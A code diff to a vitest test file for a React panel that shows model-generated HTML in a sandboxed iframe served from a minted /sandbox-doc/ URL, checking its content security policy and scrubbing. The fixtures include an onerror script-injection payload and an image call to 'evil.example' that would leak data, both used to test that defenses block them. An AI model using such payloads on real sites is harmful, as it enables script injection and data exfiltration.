@@ -3,12 +3,14 @@
 // The HTML mode carries two load-bearing assertions, because one control is not
 // enough. That document is model-generated from meeting transcript, so:
 //
-//   1. It renders in a `srcDoc` frame with `allow-scripts` but deliberately
+//   1. It renders in a frame with `allow-scripts` but deliberately
 //      WITHOUT `allow-same-origin` — the pair is what gives the frame a null
 //      origin, so its scripts cannot reach this page, its cookies, or the
-//      gateway. Adding `allow-same-origin` would silently defeat that.
+//      gateway. Adding `allow-same-origin` would silently defeat that. The
+//      document is minted to a `/sandbox-doc/` URL, not set as `srcdoc`, so it
+//      does not inherit this page's inline-permitting script policy.
 //   2. A null origin blocks READING this page and does nothing about outbound
-//      requests, so the srcdoc must also carry the egress-denying CSP that
+//      requests, so the document must also carry the egress-denying CSP that
 //      `buildSketchSrcdoc` prepends. Rendering `output` raw was the BLOCKING
 //      finding; the wiring test below is what stops it coming back.
 //   3. And the CSP alone was not enough either: it grants `script-src
@@ -19,10 +21,12 @@
 // The CSP's own content, and the scrub in both directions (nothing executable
 // survives / Mermaid and tables still render), are asserted in
 // sketchSrcdoc.test.ts. This file only pins the WIRING — that the panel routes
-// `output` through that builder instead of handing it to `srcDoc` raw.
+// `output` through that builder and the sandbox-doc mint instead of handing it
+// to the frame raw.
 
-import { describe, it, expect, vi, afterEach, onTestFinished } from 'vitest'
+import { describe, it, expect, vi, afterEach, beforeEach, onTestFinished } from 'vitest'
 import { render, renderHook, screen, fireEvent, cleanup, act, within, waitFor } from '@testing-library/react'
+import { createHash } from 'node:crypto'
 import { readFileSync } from 'node:fs'
 import { useState } from 'react'
 import { MotionGlobalConfig } from 'framer-motion'
@@ -32,6 +36,9 @@ import AgentPanelSlot from './components/AgentPanelSlot'
 import { useExpandedAgent } from './hooks/useExpandedAgent'
 import type { AgentDef } from './api'
 import { MERMAID_RUNTIME_PATH } from '../../lib/vendorPaths'
+import { api } from '../../api/client'
+import { FRAME_ALIVE_MESSAGE_TYPE, FRAME_PING_MESSAGE_TYPE } from '../../lib/widgetSrcdoc'
+import { FRAME_ALIVE_TIMEOUT_MS } from '../../hooks/useFrameAliveRecovery'
 import EN_CATALOG from '../../i18n/locales/en.json'
 
 // Read as source, not imported: these assertions are about the SHAPE of the call
@@ -71,10 +78,45 @@ function deferred() {
 afterEach(cleanup)
 
 describe('AgentPanel — html output', () => {
-  it('renders the document in a null-origin sandboxed iframe', () => {
-    const { container } = mount(HTML, { output: '<h1>Architecture</h1>' })
-    const frame = container.querySelector('iframe')!
-    expect(frame.getAttribute('srcdoc')).toContain('Architecture')
+  // The frame's document is minted to a /sandbox-doc/ URL, so the html it was
+  // given is what the mint received.
+  let mints = 0
+  beforeEach(() => {
+    mints = 0
+    vi.spyOn(api, 'sandboxDocUrl').mockImplementation(async () => ({ url: `/sandbox-doc/d${++mints}/tok` }))
+  })
+  afterEach(() => {
+    vi.restoreAllMocks()
+    vi.useRealTimers()
+  })
+
+  function minted(): string {
+    const calls = vi.mocked(api.sandboxDocUrl).mock.calls
+    if (!calls.length) throw new Error('the sketch frame never minted a document URL')
+    return String(calls[calls.length - 1][0])
+  }
+
+  async function mountSketch(output: string) {
+    const mounted = mount(HTML, { output })
+    const frame = await waitFor(() => {
+      const el = mounted.container.querySelector('iframe')
+      expect(el).not.toBeNull()
+      return el as HTMLIFrameElement
+    })
+    return { ...mounted, frame, doc: minted() }
+  }
+
+  it('loads the document from a minted /sandbox-doc/ URL, never as srcdoc', async () => {
+    // A srcdoc document inherits the dashboard's script policy, which still
+    // allows inline script; a fetched one runs under its own strict policy only.
+    const { frame, doc } = await mountSketch('<h1>Architecture</h1>')
+    expect(frame.hasAttribute('srcdoc')).toBe(false)
+    expect(frame.getAttribute('src')).toMatch(/\/sandbox-doc\/d1\/tok$/)
+    expect(doc).toContain('Architecture')
+  })
+
+  it('renders the document in a null-origin sandboxed iframe', async () => {
+    const { frame } = await mountSketch('<h1>Architecture</h1>')
     const sandbox = frame.getAttribute('sandbox')!
     expect(sandbox).toContain('allow-scripts')
     // Combining allow-scripts with allow-same-origin removes the sandbox's whole
@@ -82,50 +124,42 @@ describe('AgentPanel — html output', () => {
     expect(sandbox).not.toContain('allow-same-origin')
   })
 
-  it('never injects the model document into this page', () => {
-    const { container } = mount(HTML, {
-      output: '<img id="pwn" src="data:," onerror="stolen()">',
-    })
-    // The payload must exist ONLY as an iframe attribute, never as live DOM here:
+  it('never injects the model document into this page', async () => {
+    const { container, doc } = await mountSketch('<img id="pwn" src="data:," onerror="stolen()">')
+    // The payload must exist ONLY in the frame's document, never as live DOM here:
     // no <img> in THIS tree means nothing of the model document was mounted.
     expect(container.querySelector('img')).toBeNull()
     expect(container.querySelector('#pwn')).toBeNull()
-    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
     // It did reach the frame — this is a handoff, not a drop.
-    expect(srcdoc).toContain('id="pwn"')
-    // And the handler was removed on the way. This assertion used to read
-    // `toContain('onerror')`: at the time, keeping the handler was harmless
-    // BECAUSE it only ever lived in a sandboxed frame. It is now stripped by
-    // buildSketchSrcdoc's scrub (an `onerror` is script, and model script in that
-    // frame was the DNS-exfiltration finding), so the polarity flips — the frame
-    // never sees it at all, which is strictly stronger than what was asserted
-    // before.
-    expect(srcdoc).not.toContain('onerror')
-    expect(srcdoc).not.toContain('stolen')
+    expect(doc).toContain('id="pwn"')
+    // And the handler was removed on the way: buildSketchSrcdoc's scrub strips
+    // it (an `onerror` is script, and model script in that frame was the
+    // DNS-exfiltration finding), so the frame never sees it at all.
+    expect(doc).not.toContain('onerror')
+    expect(doc).not.toContain('stolen')
   })
 
   it('shows a placeholder before any output arrives', () => {
     const { container } = mount(HTML)
     expect(container.querySelector('iframe')).toBeNull()
     expect(screen.getByText('Sketch Artist output will appear here.')).toBeTruthy()
+    // Nothing to show, so nothing is minted.
+    expect(api.sandboxDocUrl).not.toHaveBeenCalled()
   })
 
-  it('gives the frame an accessible title', () => {
-    const { container } = mount(HTML, { output: '<p>x</p>' })
-    expect(container.querySelector('iframe')!.getAttribute('title')).toContain('Sketch Artist')
+  it('gives the frame an accessible title', async () => {
+    const { frame } = await mountSketch('<p>x</p>')
+    expect(frame.getAttribute('title')).toContain('Sketch Artist')
   })
 
-  it('gives the frame its own compositing layer so a skipped first paint cannot blank it', () => {
-    // Same mechanism and remedy as the dashboard's sandbox-doc frames (#7931):
-    // without layer promotion an engine can lay the document out, run its
-    // scripts and report a correct height while rasterizing nothing — a
+  it('gives the frame its own compositing layer so a skipped first paint cannot blank it', async () => {
+    // Same mechanism and remedy as the dashboard's other sandbox-doc frames
+    // (#7931): without layer promotion an engine can lay the document out, run
+    // its scripts and report a correct height while rasterizing nothing — a
     // correctly sized, visible frame painting an empty box, silent by
-    // construction. This frame builds its document inline via srcDoc and never
-    // reaches the sandbox-doc mint, so it sat outside that PR's scope (#8037).
-    // Chromium in this DOM paints fine either way, so removing the property
-    // looks completely harmless here: this assertion is the whole guard.
-    const { container } = mount(HTML, { output: '<h1>promoted</h1>' })
-    const frame = container.querySelector('iframe') as HTMLIFrameElement
+    // construction. Chromium in this DOM paints fine either way, so removing the
+    // property looks completely harmless here: this assertion is the whole guard.
+    const { frame } = await mountSketch('<h1>promoted</h1>')
     expect(frame.style.transform).toBe('translateZ(0)')
     // The promotion is additive: the fixed sizing that reserves the panel's
     // box must survive alongside it.
@@ -133,42 +167,143 @@ describe('AgentPanel — html output', () => {
     expect(frame.style.minHeight).toBe('340px')
   })
 
-  it('never hands the model document to srcDoc raw — it goes through buildSketchSrcdoc', () => {
+  it('never hands the model document to the frame raw — it goes through buildSketchSrcdoc', async () => {
     // This is the BLOCKING finding, as a test. The vulnerable version set
-    // srcDoc={output} directly, so the srcdoc equalled the model HTML exactly
+    // srcDoc={output} directly, so the document equalled the model HTML exactly
     // and carried no policy at all.
-    const { container } = mount(HTML, { output: '<h1>Architecture</h1>' })
-    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
-    expect(srcdoc).not.toBe('<h1>Architecture</h1>')
-    expect(srcdoc).toContain('Content-Security-Policy')
+    const { doc } = await mountSketch('<h1>Architecture</h1>')
+    expect(doc).not.toBe('<h1>Architecture</h1>')
+    expect(doc).toContain('Content-Security-Policy')
     // The two directives that close the exfiltration channel.
-    expect(srcdoc).toContain("connect-src 'none'")
-    expect(srcdoc).toContain('img-src data:;')
+    expect(doc).toContain("connect-src 'none'")
+    expect(doc).toContain('img-src data:;')
     // ...and the model content still renders.
-    expect(srcdoc).toContain('<h1>Architecture</h1>')
+    expect(doc).toContain('<h1>Architecture</h1>')
   })
 
-  it('puts the policy ahead of the model HTML, and grants img-src no https:', () => {
+  it('puts the policy ahead of the model HTML, and grants img-src no https:', async () => {
     // A <meta> CSP binds only from where it is parsed, so an <img> allowed to
     // parse first would fire under no policy. The reported repro is exactly an
     // HTTPS image URL.
-    const { container } = mount(HTML, {
-      output: '<img id="pwn" src="https://evil.example/?d=leak">',
-    })
-    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
-    expect(srcdoc.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc.indexOf('id="pwn"'))
-    const imgSrc = srcdoc.match(/img-src ([^;]*);/)![1]
+    const { doc } = await mountSketch('<img id="pwn" src="https://evil.example/?d=leak">')
+    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('id="pwn"'))
+    const imgSrc = doc.match(/img-src ([^;]*);/)![1]
     expect(imgSrc).not.toContain('https:')
     expect(imgSrc).not.toContain('*')
   })
 
-  it('serves Mermaid from our own origin so the frame needs no network', () => {
-    const { container } = mount(HTML, { output: '<div class="mermaid">graph TD;A-->B</div>' })
-    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
-    expect(srcdoc).toContain(`${window.location.origin}${MERMAID_RUNTIME_PATH}`)
+  it('serves Mermaid from our own origin so the frame needs no network', async () => {
+    const { doc } = await mountSketch('<div class="mermaid">graph TD;A-->B</div>')
+    expect(doc).toContain(`${window.location.origin}${MERMAID_RUNTIME_PATH}`)
     // script-src is pinned to that one FILE, never to the bare origin (a script
     // URL is an egress channel too).
-    expect(srcdoc).toMatch(new RegExp(`script-src 'sha256-[^']+' ${window.location.origin}${MERMAID_RUNTIME_PATH};`))
+    expect(doc).toMatch(new RegExp(`script-src( 'sha256-[^']+')+ ${window.location.origin}${MERMAID_RUNTIME_PATH};`))
+  })
+
+  it('admits each of its own inline scripts by hash, including the alive reply', async () => {
+    // The frame no longer inherits the dashboard's 'unsafe-inline', so an inline
+    // script its own policy does not name is refused. The alive reply is the one
+    // that matters for recovery: refused, every load reads as a dead frame.
+    const { doc } = await mountSketch('<div class="mermaid">graph TD;A-->B</div>')
+    const parsed = new DOMParser().parseFromString(doc, 'text/html')
+    const scriptSrc = parsed
+      .querySelector('meta[http-equiv="Content-Security-Policy"]')!
+      .getAttribute('content')!
+      .match(/script-src ([^;]*);/)![1]
+    expect(scriptSrc).not.toContain("'unsafe-inline'")
+    const inline = [...parsed.querySelectorAll('script:not([src])')].map((s) => s.textContent ?? '')
+    expect(inline.some((text) => text.includes(FRAME_PING_MESSAGE_TYPE))).toBe(true)
+    for (const text of inline) {
+      expect(scriptSrc).toContain(`'sha256-${createHash('sha256').update(text, 'utf8').digest('base64')}'`)
+    }
+  })
+
+  /** The test DOM gives a cross-origin frame no window, so the frame gets a
+   * stand-in that records the host's ping and is the `source` of its answer. */
+  function standInWindow(frame: HTMLIFrameElement) {
+    const pings: unknown[] = []
+    // `location.replace` is how a re-minted URL reaches the frame (hooks/useFrameSrc.ts).
+    const win = { postMessage: (message: unknown) => pings.push(message), location: { replace: vi.fn() } }
+    Object.defineProperty(frame, 'contentWindow', { configurable: true, value: win })
+    const answer = () => {
+      const ev = new MessageEvent('message', { data: { type: FRAME_ALIVE_MESSAGE_TYPE } })
+      Object.defineProperty(ev, 'source', { value: win })
+      window.dispatchEvent(ev)
+    }
+    return { pings, answer, replace: win.location.replace }
+  }
+
+  it('re-mints when the frame does not answer after a load (a reload onto the spent URL)', async () => {
+    const { frame } = await mountSketch('<p>x</p>')
+    const { pings, replace } = standInWindow(frame)
+    expect(api.sandboxDocUrl).toHaveBeenCalledTimes(1)
+    vi.useFakeTimers()
+    act(() => { fireEvent.load(frame) })
+    expect(pings).toContainEqual({ type: FRAME_PING_MESSAGE_TYPE })
+    await act(async () => {
+      vi.advanceTimersByTime(FRAME_ALIVE_TIMEOUT_MS)
+    })
+    expect(api.sandboxDocUrl).toHaveBeenCalledTimes(2)
+    // The fresh URL replaces the spent one in place.
+    await act(async () => {})
+    expect(replace).toHaveBeenCalledWith(expect.stringMatching(/\/sandbox-doc\/d2\/tok$/))
+  })
+
+  it('does not re-mint a frame that answers the ping', async () => {
+    const { frame } = await mountSketch('<p>x</p>')
+    const { answer } = standInWindow(frame)
+    vi.useFakeTimers()
+    act(() => { fireEvent.load(frame) })
+    act(answer)
+    await act(async () => {
+      vi.advanceTimersByTime(FRAME_ALIVE_TIMEOUT_MS)
+    })
+    expect(api.sandboxDocUrl).toHaveBeenCalledTimes(1)
+  })
+
+  it('swaps a new output into the same frame without changing its src', async () => {
+    // The outputs poll rebuilds the document; a changed src attribute would add a
+    // history entry onto a spent URL (hooks/useFrameSrc.ts).
+    const { frame, rerender, props } = await mountSketch('<p>first</p>')
+    const { replace } = standInWindow(frame)
+    rerender(<AgentPanel {...props} output="<p>second</p>" />)
+    await waitFor(() => expect(replace).toHaveBeenCalledWith(expect.stringMatching(/\/sandbox-doc\/d2\/tok$/)))
+    expect(minted()).toContain('second')
+    expect(frame.getAttribute('src')).toMatch(/\/sandbox-doc\/d1\/tok$/)
+  })
+
+  it('offers a retry when the document URL cannot be minted', async () => {
+    vi.mocked(api.sandboxDocUrl).mockRejectedValueOnce(new Error('offline'))
+    const { container } = mount(HTML, { output: '<p>x</p>' })
+    const retry = await screen.findByRole('button', { name: /Retry/ })
+    // Through ErrorNotice: announced as an alert, Retry its only control (no
+    // agent hand-off, which would drop a sibling panel's unsaved draft).
+    const alert = screen.getByRole('alert')
+    expect(alert.textContent).toContain("Couldn't render this widget")
+    expect(Array.from(alert.querySelectorAll('button'))).toEqual([retry])
+    expect(container.querySelector('iframe')).toBeNull()
+    fireEvent.click(retry)
+    await waitFor(() => expect(container.querySelector('iframe')).not.toBeNull())
+    expect(api.sandboxDocUrl).toHaveBeenCalledTimes(2)
+  })
+
+  it('offers a retry when the first mint never settles', async () => {
+    vi.useFakeTimers()
+    try {
+      // A wedged gateway: the request is accepted and never answered.
+      vi.mocked(api.sandboxDocUrl).mockReturnValueOnce(new Promise(() => {}))
+      const { container } = mount(HTML, { output: '<p>x</p>' })
+      expect(screen.queryByRole('alert')).toBeNull()
+      // useSandboxDoc's pending ceiling: `stalled` turns on, `failed` never does.
+      await act(async () => { vi.advanceTimersByTime(15_000) })
+      const alert = screen.getByRole('alert')
+      expect(alert.textContent).toContain("Couldn't render this widget")
+      expect(within(alert).getByRole('button', { name: /Retry/ })).toBeTruthy()
+      // No empty frame-sized box is left standing beside the notice.
+      expect(container.querySelector('[aria-hidden][style*="min-height"]')).toBeNull()
+    } finally {
+      vi.useRealTimers()
+    }
   })
 })
 
@@ -751,16 +886,31 @@ function ExpandHarness({
 }
 
 describe('AgentPanel — expand (#21179)', () => {
-  it('is compact by default: the sketch frame keeps its fixed 340px box', () => {
+  // The sketch frame appears once its document URL is minted.
+  beforeEach(() => {
+    vi.spyOn(api, 'sandboxDocUrl').mockResolvedValue({ url: '/sandbox-doc/d1/tok' })
+  })
+  afterEach(() => {
+    vi.restoreAllMocks()
+  })
+  const sketchFrame = (container: HTMLElement) =>
+    waitFor(() => {
+      const el = container.querySelector('iframe')
+      expect(el).not.toBeNull()
+      return el as HTMLIFrameElement
+    })
+
+  it('is compact by default: the sketch frame keeps its fixed 340px box', async () => {
     const { container } = render(<ExpandHarness agent={HTML} output="<p>diagram</p>" />)
-    const frame = container.querySelector('iframe') as HTMLIFrameElement
+    const frame = await sketchFrame(container)
     expect(frame.style.height).toBe('340px')
     expect(screen.getByLabelText('Expand Sketch Artist')).toBeTruthy()
     expect((container.firstElementChild as HTMLElement).className).not.toContain('flex-1')
   })
 
-  it('lets the sketch frame grow to the card height while expanded, then restores it', () => {
+  it('lets the sketch frame grow to the card height while expanded, then restores it', async () => {
     const { container } = render(<ExpandHarness agent={HTML} output="<p>diagram</p>" />)
+    await sketchFrame(container)
     fireEvent.click(screen.getByLabelText('Expand Sketch Artist'))
 
     const card = container.firstElementChild as HTMLElement
